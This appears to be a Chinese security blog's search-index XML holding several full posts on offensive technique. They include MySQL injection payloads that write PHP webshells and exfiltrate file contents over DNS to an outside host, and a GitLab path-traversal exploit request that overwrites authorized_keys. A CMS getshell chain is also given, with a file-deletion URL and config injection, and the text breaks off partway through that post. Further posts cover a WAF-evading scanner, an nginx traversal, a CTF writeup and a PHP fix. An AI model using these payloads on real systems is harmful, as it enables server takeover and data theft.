<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[报错注入邂逅load_file&into outfile搭讪LINES]]></title>
    <url>%2F2018%2F07%2F19%2Fmysql_file%2F</url>
    <content type="text"><![CDATA[0x00 前言近期分析mysql利用报错注入读取文件内容，利用LINES TERMINATED BY在查询只返回一个字段时写webshell文件，以及如何利用load_file扫描判断文件是否存在。 0x01 into outfile写文件 要求用户具有file权限 文件不能覆盖写入，所以文件必须为不存在 如果secure_file_priv非空，则写入文件的目录只能为对应目录下 注意: FIELDS TERMINATED BY原理为在输出数据的每个字段之间插入webshell内容，所以如果select返回的只有一个字段，则写入的文件不包含webshell内容,例如下面语句SELECT username FROM user WHERE id = 1 into outfile &#39;D:/1.php&#39; FIELDS TERMINATED BY 0x3c3f70687020706870696e666f28293b3f3e，写入的文件中只包含username的值而没有webshell内容; LINES TERMINATED BY和LINES STARTING BY原理为在输出每条记录的结尾或开始处插入webshell内容，所以即使只查询一个字段也可以写入webshell内容，更为通用。此外，该类方式可以引用于limit等不能union的语句之后进行写文件操作。 1. union注入写文件1SELECT * FROM user WHERE id = -1 union select 1,2,0x3c3f70687020706870696e666f28293b3f3e into outfile 'D:/1.php' 2. FIELDS TERMINATED BY（可在limit等语句后）1SELECT * FROM user WHERE id = 1 into outfile 'D:/1.php' fields terminated by 0x3c3f70687020706870696e666f28293b3f3e 3. LINES TERMINATED BY（可用于limit等sql注入）1SELECT username FROM user WHERE id = 1 into outfile 'D:/1.php' LINES TERMINATED BY 0x3c3f70687020706870696e666f28293b3f3e 4. LINES STARTING BY（可用于limit等sql注入）1SELECT username FROM user WHERE id = 1 into outfile 'D:/2.php' LINES STARTING BY 0x3c3f70687020706870696e666f28293b3f3e 0x02 LOAD_FILE读文件 要求用户具有file权限 如果secure_file_priv非空，则只能读取对应目录下的文件 1. 联合注入+load_file读文件1SELECT * FROM user WHERE id=-1 UNION select 1,'1',(select load_file('D:/1.php')) 2. DNSLOG带外查询 需要windows环境 1SELECT id FROM user WHERE id = load_file (concat('\\\\',hex((select load_file('D:/1.php'))),'.t00ls.xxxxxxxxx.tu4.org\\a.txt')) 3. 报错注入+load_file读文件ps:报错注入读文件内容，有时候会由于报错长度受限或者文件编码问题，推荐采用hex编码方式分段读取文件内容 123select * from user where username = '' and updatexml(0,concat(0x7e,(LOAD_FILE('D:/1.php')),0x7e),0) select * from user where id=1 and (extractvalue(1,concat(0x7e,(select (LOAD_FILE('D:/1.php'))),0x7e))) 某CMS报错注入读取文件实例1: 某CMS报错注入读取文件实例2: 0x03 扫描文件是否存在 要求用户具有file权限 如果secure_file_priv非空，则只能扫描判断对应目录下的文件 原理：load_file读取文件时，如果没有对应的权限获取或者文件不存在则函数返回NULL,所以结合isnull+load_file可以扫描判断文件名是否存在 1234567如果文件存在，isnull(load_file('文件名'))返回0mysql&gt; select * from user where username = '' and updatexml(0,concat(0x7e,isnull(LOAD_FILE('D:/1.php')),0x7e),0);ERROR 1105 (HY000): XPATH syntax error: '~0~'如果文件不存在isnull(load_file('文件名'))返回1mysql&gt; select * from user where username = '' and updatexml(0,concat(0x7e,isnull(LOAD_FILE('D:/xxxxx')),0x7e),0);ERROR 1105 (HY000): XPATH syntax error: '~1~' 某CMS报错注入扫描文件实例，存在文件C:/Windows/win.ini 某CMS报错注入扫描文件实例，不存在文件C:/Windows/passwd 可以结合burp爆破扫描文件名 0x04小结 倘若知道绝对路径且有权限时，通常都是直接into outfile写webshell 不知道网站绝对路径时，可以尝试读取常见的配置文件获取网站绝对路径，然后进行写操作；或者直接读取敏感的文件，获取信息进行其他操作。 此外load_file可以在盲注情况下，利用DNSLOG带外获取内容，或者hex()函数转换后按位读取敏感的文件内容 还有很多的利用技巧，大家自行研究，多多分享]]></content>
      <categories>
        <category>Security</category>
      </categories>
      <tags>
        <tag>Mysql</tag>
        <tag>webshell</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[BFscan-A Bypass waF Scanner]]></title>
    <url>%2F2018%2F07%2F18%2FBFscan%2F</url>
    <content type="text"><![CDATA[0x00前言基于python3实现规避防火墙的轻量级信息探测工具,Github地址 0x02BFscan BFscan is a tiny Bypass waF Scanner 基于python3默认模块，无需安装任何第三方模块即可使用防火墙规避策略 基于telnetlib实现telnet扫描，可以达到一定bypass防火墙的效果 支持ip段扫描（CIDR地址块），采取ip地址随机化，避免同一时间段对相邻ip进行扫描，尽量规避触发防火墙规则 极限情况下，–slow参数设置单进程扫描，并在每次端口探测之前添加5-20秒的随机延迟Usage123456789101112131415161718192021222324252627 ___ ___ / __\ / __\__ ___ __ _ _ __ /__\/// _\/ __|/ __/ _` | '_ \/ \/ \ / \__ \ (__ (_| | | | |\_____\/ |___/\___\__,_|_| |_|A Bypass waF Scannerstarting......Usage: BFscan.py [options]Options: -h, --help show this help message and exit -m MULTIPROCESS, --multiprocess=MULTIPROCESS Num of multiprocess running concurrently, 30 by default -t THREADS, --threads=THREADS Num of scan threads for each scan process, 10 by default --ip=IP IP addresses. Ex: 192.168.0.1 or 192.168.1.0/24 -p PORT, --port=PORT Scan specified ports, default: 21-22,445,80-88,1433,27 017,3306,3389,6379,8080-8088,9200 --timeout=TIMEOUT Max timeout for each telnet connection, 10 by default --slow Slow model to bypass waf,which will set threads=1 and add random delay of 5-20 seconds for each port scan. It will be very slow, please use it carefully.]]></content>
      <categories>
        <category>Security</category>
      </categories>
      <tags>
        <tag>BFscan</tag>
        <tag>Python</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[PHP索引数组+unset使用不当导致的问题]]></title>
    <url>%2F2018%2F07%2F14%2FPhp_unset%2F</url>
    <content type="text"><![CDATA[0x00前言首发先知论坛，通常网站后台可以配置允许上传附件的文件类型，一般登录后台，添加php类型即可上传php文件getshell。但是，随着开发者安全意识的提高，开发者可能会在代码层面强制限制php等特定文件类型的上传，有时会使用unset函数销毁删除允许上传文件类型的索引数组,如：Array(‘gif’,’jpg’,’jpeg’,’bmp’,’png’,’php’)，不过错误地使用unset函数并不能到达过滤限制的效果。 0x01问题详情问题描述： 最近在审计某CMS代码过程中，发现后台限制文件上传类型的代码如下：1234$ext_limit = $ext_limit != '' ? parse_attr($ext_limit) : '';foreach (['php', 'html', 'htm', 'js'] as $vo) &#123; unset($ext_limit[$vo]);&#125; 其目的是实现:获取配置中的允许上传文件类型$ext_limit并转换为数组，无论后台是否添加了php等类型文件，均强制从允许上传文件类型的数组中删除php,html,htm,js等类型。 但是由于unset函数使用不当，导致其代码无法达到该目的。具体地，执行如下代码：123456$ext_limit = Array('gif','jpg','jpeg','bmp','png','php');var_dump($ext_limit);foreach (['php', 'html', 'htm', 'js'] as $vo) &#123; unset($ext_limit[$vo]);&#125;var_dump($ext_limit); 得到输出为如下，可以看到php并没有被删除1234567891011121314151617D:\wamp\www\test.php:15:array (size=6) 0 =&gt; string 'gif' (length=3) 1 =&gt; string 'jpg' (length=3) 2 =&gt; string 'jpeg' (length=4) 3 =&gt; string 'bmp' (length=3) 4 =&gt; string 'png' (length=3) 5 =&gt; string 'php' (length=3)D:\wamp\www\test.php:19:array (size=6) 0 =&gt; string 'gif' (length=3) 1 =&gt; string 'jpg' (length=3) 2 =&gt; string 'jpeg' (length=4) 3 =&gt; string 'bmp' (length=3) 4 =&gt; string 'png' (length=3) 5 =&gt; string 'php' (length=3) 问题分析： unset函数的使用说明可以参考php官网，简单理解就是：unset可以销毁掉一个变量；或者根据传入的key值，销毁数组类型中指定的键值对。针对PHP 索引数组，调用unset时必须调用其对应的数字索引才能销毁指定的键值对。所以如果传入unset函数的参数不是索引，而是其值的情况（如此处unset(‘php’)），无法销毁删除对应为php的键值对。 0x03修复办法修改以上存在缺陷的代码为如下,主要是枚举索引数组为key=&gt;value的形式，根据value进行比较，满足条件时将对应的key传入unset函数，从而销毁删除。12345678910$ext_limit = Array('gif','jpg','jpeg','bmp','png','php');var_dump($ext_limit);foreach (['php', 'html', 'htm', 'js'] as $vo) &#123; foreach($ext_limit as $key=&gt;$value)&#123; if($value===$vo)&#123; unset($ext_limit[$key]); &#125; &#125; &#125;var_dump($ext_limit); 输出结果如下(php对应的键值对已被删除)：12345678910111213141516D:\wamp\www\test.php:15:array (size=6) 0 =&gt; string 'gif' (length=3) 1 =&gt; string 'jpg' (length=3) 2 =&gt; string 'jpeg' (length=4) 3 =&gt; string 'bmp' (length=3) 4 =&gt; string 'png' (length=3) 5 =&gt; string 'php' (length=3)D:\wamp\www\test.php:23:array (size=5) 0 =&gt; string 'gif' (length=3) 1 =&gt; string 'jpg' (length=3) 2 =&gt; string 'jpeg' (length=4) 3 =&gt; string 'bmp' (length=3) 4 =&gt; string 'png' (length=3) 0x04小结使用索引数组时，如果要使用unset销毁删除指定的键值对，切记采用枚举索引数组为key=&gt;value的形式，根据value进行比较，满足条件时将对应的key传入unset函数 ps:安全问题的分析与挖掘就是一个开发者与hacker攻防较量的过程，对抗的点就是哪一方考虑的更加周全。]]></content>
      <categories>
        <category>代码审计</category>
      </categories>
      <tags>
        <tag>PHP， 代码审计， Security</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Gitlab远程代码执行漏洞]]></title>
    <url>%2F2018%2F05%2F30%2FGitlab_rce%2F</url>
    <content type="text"><![CDATA[0x00前言首发于先知论坛， 近期Hackerone公开了Gitlab的任意文件写入，导致远程代码执行漏洞，实践一波。 0x01漏洞描述app/services/projects/gitlab_project_import_service.rb123456789101112131415161718192021222324# This service is an adapter used to for the GitLab Import feature, and# creating a project from a template.# The latter will under the hood just import an archive supplied by GitLab.module Projects class GitlabProjectsImportService # ... def execute FileUtils.mkdir_p(File.dirname(import_upload_path)) FileUtils.copy_entry(file.path, import_upload_path) Gitlab::ImportExport::ProjectCreator.new(params[:namespace_id], current_user, import_upload_path, params[:path]).execute end # ... def tmp_filename "#&#123;SecureRandom.hex&#125;_#&#123;params[:path]&#125;" end endend import_upload_path将未过滤的参数params[:path]添加到gitlab上传目录，导致存在目录遍历，此外由于文件内容没有限制，最终导致任意内容写入任意文件。由于默认gitlab创建并启动了git账户，该账户默认目录为/var/opt/gitlab/，修改.ssh/authorized_keys文件为攻击者的公钥，即可以git用户身份成功登录服务器，从而导致命令执行。 影响版本： GitLab CE and EE 8.9.0 - 9.5.10 GitLab CE and EE 10.0.0 - 10.1.5 GitLab CE and EE 10.2.0 - 10.2.5 GitLab CE and EE 10.3.0 - 10.3.3 0x02漏洞利用复现1. 环境搭建利用docker搭建gitlab1docker run -d --name gitlab -p 80:80 -p 443:443 -p 2222:22 gitlab/gitlab-ce:10.2.4-ce.0 修改配置文件123456789docker exec -it gitlab /bin/bashnano /etc/gitlab/gitlab.rb# 去掉gitlab的注释并修改对应ipexternal_url '192.168.1.100'#重新载入配置文件gitlab-ctl reconfigure# 访问对应ip，第一次需要设置密码，并新建用户http://192.168.1.100/ 本地利用ssh-keygen生成公私钥对（用于攻击替换和登录） 2. POC及利用 登录gitlab-&gt;创建项目-&gt;Import project-&gt;GitLab Import-&gt;选择文件 然后选择前面ssh-keygen生成的公钥（注意是公钥） 点击import project 后，burp修改path的值为/../../../../../../../../../var/opt/gitlab/.ssh/authorized_keys,数据包如下 12345678910111213141516171819202122232425262728293031323334353637383940POST /import/gitlab_project HTTP/1.1Host: 192.168.1.100User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:53.0) Gecko/20100101 Firefox/53.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3Accept-Encoding: gzip, deflateContent-Type: multipart/form-data; boundary=---------------------------20787582420424Content-Length: 1214Referer: http://192.168.1.100/import/gitlab_project/new?namespace_id=2&amp;path=Cookie: _gitlab_session=9c5f21dbfe98d90b1d992e1c9907584c; sidebar_collapsed=falseConnection: closeUpgrade-Insecure-Requests: 1-----------------------------20787582420424Content-Disposition: form-data; name="utf8"â-----------------------------20787582420424Content-Disposition: form-data; name="authenticity_token"JoWtToPxTJL6RVASaprnR1hRqEGARnbLkA06favQLxQ7Y7YtyqfE9+JsbV/NAwy7XAdTuzgRsxJ/Kl1hH9V6xA==-----------------------------20787582420424Content-Disposition: form-data; name="namespace_id"&#123;:value=&gt;2&#125;-----------------------------20787582420424Content-Disposition: form-data; name="path"ssh/../../../../../../../../../var/opt/gitlab/.ssh/authorized_keys-----------------------------20787582420424Content-Disposition: form-data; name="namespace_id"2-----------------------------20787582420424Content-Disposition: form-data; name="file"; filename="id_rsa.pub"Content-Type: application/vnd.ms-publisherssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC+McaRvLdnm+u30cACV4ftHJUESNVNV/VNlwm5xST343cFQODjBua5ffpCgDIejiVhyz9BzMmmynN5tnN6JQlx4SwSGkuR3+wzbJ8XKJNHLpOeZ2Xzw+UA9duDinDQHUklFwDmjH7Pywy6kRurIWXTsdupkLrHobEjSjrwEkqvLUnRi1EA/nU5es+kEz6c04jDUrZoGaj5GiI7VYReX+d9Pm524H9KfBpFIZ27yaWs1lR9b+dXjbXnUdysKdWTQcwy1tv+xhEbwF9m/PQajAEPPl95u/qrGPMqT0l08dC6H9o50i9Yn0Yf3t946g4QjGBs+GZgaNoLda8d5U5S8XLz BF@DESKTOP-4UM7GF4-----------------------------20787582420424-- 发送请求后，使用用户名git以及生成的私钥登录gitlab服务器，如下是执行命令的demo 12$ iduid=998(git) gid=998(git) groups=998(git) 0x03参考链接https://about.gitlab.com/2018/01/16/gitlab-10-dot-3-dot-4-released/https://hackerone.com/reports/298873]]></content>
      <categories>
        <category>漏洞分析</category>
      </categories>
      <tags>
        <tag>Gitlab</tag>
        <tag>RCE</tag>
        <tag>目录遍历</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Nginx错误配置alias导致目录遍历漏洞]]></title>
    <url>%2F2018%2F05%2F23%2FNginx_alias_misconfig_path_traversle%2F</url>
    <content type="text"><![CDATA[0x00 前言nginx错误配置alias，导致存在目录遍历，可跳出限制读取上一层目录及其任意子目录的文件的任意文件。 0x01 环境搭建 使用richarvey/nginx-php-fpm镜像 1docker run -d -p 80:80 richarvey/nginx-php-fpm 配置nginx，添加配置test路由解析到/var/www/html/路径（注意：/test没有结尾的/） 1234# /etc/nginx/sites-available/default.conflocation /test &#123; alias /var/www/html/; &#125; 对应Web服务的文件结构，目标是目录遍历获取flag.txt的内容 123456|--var |--www |--flag.txt |--html |--index.php |--test.txt 0x02 漏洞利用 通过访问http://127.0.0.1/test/test.txt可以成功访问到test的内容如下(/test/test.txt路由请求，经处理后转换成：/var/www/html/test.txt)： 1this is a test 修改请求为http://127.0.0.1/test../flag.txt，可以成功跳到上一层目录下，读取到flag.txt的内容(`/test../flag.txt`路由请求，经处理后转换成：`/var/www/flag.txt`) 1you get me, hahaha 0x03小结: 只能跳到上一层目录，读取上一层目录及其任意子目录的文件，不能任意目录遍历读取任意文件,有局限性。 需要nginx配置缺陷，实战情况比较有限，但是真实存在（如：参考链接3）。 一种场景是：很多网站会把备份文件放置在网页目录的上一层路径下，利用遍历读取备份文件；另一种场景是：路由限制到上传或静态图片路径，利用遍历读取上一层路径下的配置文件等。 0x04参考链接： https://github.com/yandex/gixy/blob/master/docs/en/plugins/aliastraversal.md https://hackerone.com/reports/317201 https://hackerone.com/reports/312510]]></content>
      <categories>
        <category>漏洞分析</category>
      </categories>
      <tags>
        <tag>Security</tag>
        <tag>目录遍历</tag>
        <tag>Nginx</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Win10下常用的修改注册表Tips]]></title>
    <url>%2F2018%2F05%2F07%2Fwin10_reg_cmd_bash_ipsec%2F</url>
    <content type="text"><![CDATA[0x00 前言 Win10快速右键添加“在此处打开CMD”以及安装了ubuntu子系统或者Kali子系统的情况下，右键添加“在此处打开Bash” 解决Win10连接IPsec VPN报错问题。 0x01 Win10右键添加“在此处打开CMD”保存以下代码为cmd.reg,然后点击运行即可123456789101112131415161718Windows Registry Editor Version 5.00[HKEY_CLASSES_ROOT\Directory\shell\open_cmd]@="Open CMD Here""HasLUAShield"=""[HKEY_CLASSES_ROOT\Directory\shell\open_cmd\command]@="cmd.exe /s /k pushd \"%V\""[-HKEY_CLASSES_ROOT\Directory\Background\shell\open_cmd][HKEY_CLASSES_ROOT\Directory\Background\shell\open_cmd]@="在此处打开CMD窗口""HasLUAShield"="""Icon"="cmd.exe"[HKEY_CLASSES_ROOT\Directory\Background\shell\open_cmd\command]@="cmd.exe /s /k pushd \"%V\""[-HKEY_CLASSES_ROOT\Drive\shell\open_cmd][HKEY_CLASSES_ROOT\Drive\shell\open_cmd]@="Open CMD Here""HasLUAShield"=""[HKEY_CLASSES_ROOT\Drive\shell\open_cmd\command] 0x02 Win10右键添加“在此处打开Bash”ps:前提是安装了Win10的ubuntu子系统或者Kali子系统 保存以下代码为bash.reg,然后点击运行即可123456789101112131415161718Windows Registry Editor Version 5.00[HKEY_CLASSES_ROOT\Directory\shell\open_bash]@="Open Bash Here""HasLUAShield"=""[HKEY_CLASSES_ROOT\Directory\shell\open_bash\command]@="bash.exe"[-HKEY_CLASSES_ROOT\Directory\Background\shell\open_bash][HKEY_CLASSES_ROOT\Directory\Background\shell\open_bash]@="在此处打开Bash窗口""HasLUAShield"="""Icon"="bash.exe"[HKEY_CLASSES_ROOT\Directory\Background\shell\open_bash\command]@="bash.exe"[-HKEY_CLASSES_ROOT\Drive\shell\open_bash][HKEY_CLASSES_ROOT\Drive\shell\open_bash]@="Open Bash Here""HasLUAShield"=""[HKEY_CLASSES_ROOT\Drive\shell\open_bash\command] 0x03 Win10解决IPsecVPN连接报错问题ps:适用于：Windows Vista, 7, 8, 10, and 2008 Server:报错信息： 无法建立计算机与 VPN服务器之间的网络连接，因为远程服务器未响应。这可能是因为未将计算机与远程服务器之间的某种网络设备(如防火墙、NAT、路由器等)配置为容许 VPN 连接。请与管理员或服务供给商联系以确定哪种设备可能产生此问题 解决办法：保存如下代码为ipsec.reg，然后双击运行即可123Windows Registry Editor Version 5.00 [HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\PolicyAgent] "AssumeUDPEncapsulationContextOnSendRule"=dword:00000002]]></content>
      <categories>
        <category>技术研究</category>
      </categories>
      <tags>
        <tag>Windows</tag>
        <tag>VPN</tag>
        <tag>IPsec</tag>
        <tag>CMD</tag>
        <tag>Bash</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[DDCTF2018 部分WriteUP]]></title>
    <url>%2F2018%2F04%2F20%2FDDCTF2018%2F</url>
    <content type="text"><![CDATA[前言最近参加DDCTF2018，记录其中两个题的WriteUp 1. 第四扩展FS题目给了一张图片，用foremost提取出一张图片和加密的zip压缩包，爆破解压密码许久都没有成功，用EmEditor打开看到有字符串：Pactera，成功解压压缩包，然后根据提示需要统计字符出现次数。123456from collections import Counterf=open("file.txt",'r')print(Counter(f.readlines()[0]))#输出:Counter(&#123;'D': 3950, 'C': 1900, 'T': 1850, 'F': 1800, '&#123;': 1750, 'h': 1700, 'u': 1650, 'a': 1600, 'n': 1550, 'w': 1500, 'e': 1450, '1': 1400, 's': 1350, 'i': 1300, 'k': 1250, '4': 1200, 'o': 1150, '!': 1100, '&#125;': 1050&#125;) 得到flag:DDCTF{huanwe1sik4o!} 2. 安全通信该题使用ECB(电子密码本模式)进行加密，由于分组模式中ECB模式相同的明文分组，会得到相同密文输出。 根据这个特性，以爆破第一位为例，构造输入Agent ID 为45个1，加密消息为：1Connection for mission: ID为111111111111111111111111111111111111111111111, your mission's flag is: D 然后加上Flag的第一位，构成96（16*6）个字符长度输入，截取密文的前192（32*6）。1234567891011121314151617Please enter mission key:b9ba15b341c847c8beba85273f9b7f90#Agent ID为45个1Please enter your Agent ID to secure communications:#返回的欢迎加密信息，取前192位作为判断111111111111111111111111111111111111111111111ce62ff6f5ebd23a8d059b1bd831a8d0fed6d82e4257f35a62ef76a43970ade3e06b6e8e7589fddd8b8ac55e5c29625e906b6e8e7589fddd8b8ac55e5c29625e9eae01a76a2f84e768e4408555cb4acbf17888d387e8b7756e9a3de2a68b4fbf726b43ef60ec00ce6bfbdf91d4d9dba79bb2983e79315def49a0fa8eaa10cd4a8250e53382d70f71936a32961d5741662Please send some messages to be encrypted, 'quit' to exit:#猜测第一位为CConnection for mission: 111111111111111111111111111111111111111111111, your mission's flag is: Cce62ff6f5ebd23a8d059b1bd831a8d0fed6d82e4257f35a62ef76a43970ade3e06b6e8e7589fddd8b8ac55e5c29625e906b6e8e7589fddd8b8ac55e5c29625e9eae01a76a2f84e768e4408555cb4acbf18c2aed45181d467f22c858da3d1b03bPlease send some messages to be encrypted, 'quit' to exit:#猜测第一位为DConnection for mission: 111111111111111111111111111111111111111111111, your mission's flag is: Dce62ff6f5ebd23a8d059b1bd831a8d0fed6d82e4257f35a62ef76a43970ade3e06b6e8e7589fddd8b8ac55e5c29625e906b6e8e7589fddd8b8ac55e5c29625e9eae01a76a2f84e768e4408555cb4acbf17888d387e8b7756e9a3de2a68b4fbf7Please send some messages to be encrypted, 'quit' to exit: 当输入的最后一位为D时，加密结果和欢迎消息密文的前192位结果相同。接下来爆破Flag的第二位时，将Agent ID位数减1（44位）。依次递增Flag位数，同时递减Agent ID位数即可爆破出Flag，写个脚本。 1234567891011121314151617181920212223242526272829303132333435#Connection for mission: 111111111111111111111111111111111111111111111, your mission's flag is: Dfrom pwn import *mission_key="b9ba15b341c847c8beba85273f9b7f90"flag=""payloads = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890abcdefghijklmnopqrstuvwxyz.@_-&#125;&#123;'for i in range(50): r = remote('116.85.48.103', 5002) r.recvuntil("Please enter mission key:") r.sendline(mission_key) mission_len=45-i r.recvuntil("Please enter your Agent ID to secure communications:") r.sendline("1"*mission_len) data_1=r.recvuntil("Please send some messages to be encrypted, 'quit' to exit:").strip()[:192] #print data_1 for j in payloads: name="1"*mission_len flag_buf=flag+j message = "Connection for mission: &#123;&#125;, your mission's flag is: &#123;&#125;".format(name, flag_buf) #print message r.sendline(message) data_2=r.recvuntil("Please send some messages to be encrypted, 'quit' to exit:").strip()[:192] #print data_2 if data_1==data_2: flag=flag+j print flag r.sendline("quit") if j=='&#125;': exit(0) break#输出……DDCTF&#123;afd18f4a112ca67951fc95afb92b7DDCTF&#123;afd18f4a112ca67951fc95afb92b74DDCTF&#123;afd18f4a112ca67951fc95afb92b74d8DDCTF&#123;afd18f4a112ca67951fc95afb92b74d8&#125; 得到Flag；DDCTF{afd18f4a112ca67951fc95afb92b74d8}]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>WriteUP</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Mysql 执行优先级和sleep函数延时注入的一个Tip]]></title>
    <url>%2F2018%2F03%2F13%2FMysql_sleep%2F</url>
    <content type="text"><![CDATA[0x00前言代码审计发现了一个基于时间延迟的SQL盲注，但是发现 sleep(2)成功获取数据时页面返回时间均为4秒，即为设置时间的两倍，所以有了下面的分析。 0x01Mysql 执行优先级和sleep函数Mysql语句关于AND和OR执行优先级和Mysql查询优化策略有以下几点： AND的优先级大于OR，先计算AND的结果，再计算or的结果 同优先级AND中如果有恒为0(如and 1=2),则直接返回0，不执行同级中的其他语句 多个OR连接的语句中如果有恒为1(如or 1=1),则直接返回1，不执行的其他语句 首先测试数据表结构和数据如下： 123456789mysql&gt; select * from ctf;+--------+----------+-----------+------+| userid | username | signature | mood |+--------+----------+-----------+------+| 1002 | test2 | test2 | 1 || 1001 | test1 | test1 | 1 || 100 | 32313333 | test | 0 |+--------+----------+-----------+------+3 rows in set (0.00 sec) 执行select * from ctf where mood=sleep(1)，延时了3秒。（没有限定条件，和数据表的每一条进行对比，进行了3次sleep(1)函数） 1234567mysql&gt; select * from ctf where mood=sleep(1) ;+--------+----------+-----------+------+| userid | username | signature | mood |+--------+----------+-----------+------+| 100 | 32313333 | test | 0 |+--------+----------+-----------+------+1 row in set (3.00 sec) 执行select * from ctf where username=’test2’ and mood=sleep(1);延时1秒。（先筛选username=’test2’，只有1条记录，进行了1次sleep(1)函数） 12mysql&gt; select * from ctf where username='test2' and mood=sleep(1);Empty set (1.00 sec) 执行 select * from ctf where userid&gt;100 and mood=sleep(1);延时2秒。（先筛选userid&gt;100，有2条记录，进行了2次sleep(1)函数） 12mysql&gt; select * from ctf where userid&gt;100 and mood=sleep(1);Empty set (2.00 sec) select * from ctf where userid&gt;100 and 1=2 and mood=sleep(1);没有延时直接返回空。（由于sleep之前有and 1=2,不可能成立，直接返回空，没有执行sleep(1)） 12mysql&gt; select * from ctf where userid&gt;100 and 1=2 and mood=sleep(1);Empty set (0.00 sec) 执行select * from ctf where userid&gt;100 and 1=2 or mood=sleep(1);延时3秒（根据优先级，先计算执行100 and 1=2,不可能成立，没有符合要求的数据记录，但是还需要判断or之后的条件，所以仍然要查询比对三次，执行3次sleep(1)） 1234567mysql&gt; select * from ctf where userid&gt;100 and 1=2 or mood=sleep(1);+--------+----------+-----------+------+| userid | username | signature | mood |+--------+----------+-----------+------+| 100 | 32313333 | test | 0 |+--------+----------+-----------+------+1 row in set (3.00 sec) 执行select from ctf where userid&gt;100 and 1=sleep(1) or mood=0;延时2秒，执行select from ctf where 1=sleep(1) and userid&gt;100 or mood=0;延时3秒，两者返回结果一致，但是由于执行顺序不同，导致延时不同。（前一种情况根据优先级，执行userid&gt;100 and 1=sleep(1)，通过userid&gt;100筛选只有两条记录，然后再sleep(1)，所以只延时2秒。后一种情况，根据优先级，执行1=sleep(1) and userid&gt;100，直接利用1=sleep(1)的条件和数据库记录对比以后，再判断userid&gt;100的条件，要全部比对执行三次，所以延时3秒。） 1234567891011121314mysql&gt; select * from ctf where userid&gt;100 and 1=sleep(1) or mood=0;+--------+----------+-----------+------+| userid | username | signature | mood |+--------+----------+-----------+------+| 100 | 32313333 | test | 0 |+--------+----------+-----------+------+1 row in set (2.00 sec)mysql&gt; select * from ctf where 1=sleep(1) and userid&gt;100 or mood=0;+--------+----------+-----------+------+| userid | username | signature | mood |+--------+----------+-----------+------+| 100 | 32313333 | test | 0 |+--------+----------+-----------+------+1 row in set (3.00 sec) 执行select * from ctf where userid&gt;100 and 1=sleep(1) or mood=0 or 1=1;延时0秒。（userid&gt;100 and 1=sleep(1) or mood=0 or 1=1,在OR连接的语句中有恒成立的1=1，所以直接返回结果，没有延时。） 123456789mysql&gt; select * from ctf where userid&gt;100 and 1=sleep(1) or mood=0 or 1=1;+--------+----------+-----------+------+| userid | username | signature | mood |+--------+----------+-----------+------+| 1002 | test2 | test2 | 1 || 1001 | test1 | test1 | 1 || 100 | 32313333 | test | 0 |+--------+----------+-----------+------+3 rows in set (0.00 sec) 0x02小结由于MySQL的条件优先级的不同，在不同语句中执行sleep()函数导致的延迟时间（执行次数）不同，一个比较简单的判断就是，判断sleep()函数所在的点，进行数据查询时需要对比的数据记录数，即等于sleep()函数执行的次数。]]></content>
      <categories>
        <category>数据库</category>
      </categories>
      <tags>
        <tag>Security</tag>
        <tag>Mysql</tag>
        <tag>数据库</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[某CMS5.X版本GETSHELL漏洞合集-五连杀]]></title>
    <url>%2F2018%2F03%2F13%2F5_x_getshell%2F</url>
    <content type="text"><![CDATA[0x00 前言首发于：先知社区: 某CMS 5.X版本GETSHELL漏洞合集2018年1月底某CMS官方隆重发布6.0版本，调整了之前“漏洞百出”的框架结构，修（杜）复（绝）了多个5.X的版本后台Gestshell漏洞。 0x01安装过程过滤不严导致Getshell前提:有删除/config/install.lock权限 1. 结合网上爆出某CMS 的后台任意文件删除漏洞1234567891011121314151617#/admin/app/batch/csvup.php$classflie=explode('_',$fileField);$classflie=explode('-',$classflie[count($classflie)-1]);$class1=$classflie[0];$class2=$classflie[1];$class3=$classflie[2];$class=$class3?$class3:($class2?$class2:$class1); $classcsv=$db-&gt;get_one("select * from $met_column where id=$class");if(!$classcsv)&#123;metsave("../app/batch/contentup.php?anyid=$anyid&amp;lang=$lang",$lang_csvnocolumn,$depth);&#125;# 省略代码@file_unlink($flienamecsv); 删除/config/install.lock文件可以导致重装（需要由对应的删除权限），删除文件的poc如下：1http://xxx.com/admin/app/batch/csvup.php?fileField=1_1231-1&amp;flienamecsv=../../../config/install.lock 2. 重装时数据库配置文件过滤不当1234567891011121314151617181920212223#/install/index.php case 'db_setup': &#123; if($setup==1)&#123; $db_prefix = trim($db_prefix); $db_host = trim($db_host); $db_username = trim($db_username); $db_pass = trim($db_pass); $db_name = trim($db_name); $config="&lt;?php /* con_db_host = \"$db_host\" con_db_id = \"$db_username\" con_db_pass = \"$db_pass\" con_db_name = \"$db_name\" tablepre = \"$db_prefix\" db_charset = \"utf8\"; */ ?&gt;"; $fp=fopen("../config/config_db.php",'w+'); fputs($fp,$config); fclose($fp); 在数据库配置时$db_host,$db_username,$db_pass,$db_name,$db_prefix参数可控。 3. POC数据库配置时修改任意参数为*/phpinfo();/*可导致Getshell。点击保存之后，直接访问/config/config_db.php即可getshell。shell地址:http://xxx.com/config/config_db.php 0x02 iconv函数缺陷+条件竞争Getshell前提:windows服务器+php版本&lt;5.4.0 1. 漏洞点123456789101112131415161718#\admin\app\batch\csv.phpfputcsv($fp,$fristarray); fputcsv($fp,$csvarray); fclose($fp);$sqlzip='csv.zip';$archive = new PclZip($sqlzip);$zip_list = $archive-&gt;create("./$title.csv");$cont = iconv($codeold,$codenew,"&#123;$lang_csvexplain1&#125;\r\n&#123;$lang_csvexplain2&#125;\r\n&#123;$lang_csvexplain3&#125;\r\n&#123;$lang_csvexplain4&#125;");$fp = 